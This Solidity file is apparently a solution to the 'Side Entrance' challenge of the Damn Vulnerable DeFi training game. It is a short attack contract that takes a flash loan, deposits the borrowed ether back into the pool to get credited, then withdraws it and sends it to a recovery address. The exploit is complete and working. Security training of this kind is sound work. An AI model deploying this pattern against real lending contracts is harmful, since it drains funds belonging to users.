// SPDX-License-Identifier: MIT
// Damn Vulnerable DeFi v4 (https://damnvulnerabledefi.xyz)
//This contract is for `SideEntrance.t.sol` Attack

import {SideEntranceLenderPool} from "../../src/side-entrance/SideEntranceLenderPool.sol";

pragma solidity =0.8.25;


contract Attack {

    SideEntranceLenderPool public pool;
    address public recovery;
    uint256 exploitAmount;

    constructor(address _pool, address _recovery, uint256 _amount ) {
        pool = SideEntranceLenderPool(_pool);
        recovery = _recovery;
        exploitAmount = _amount;
    }

    function attack() external returns (bool) {
        pool.flashLoan(exploitAmount);
        pool.withdraw();
        payable(recovery).transfer(exploitAmount);
        return true;
    }

    function execute() external payable {
        pool.deposit{value: msg.value}();
    }

    receive() external payable{}

}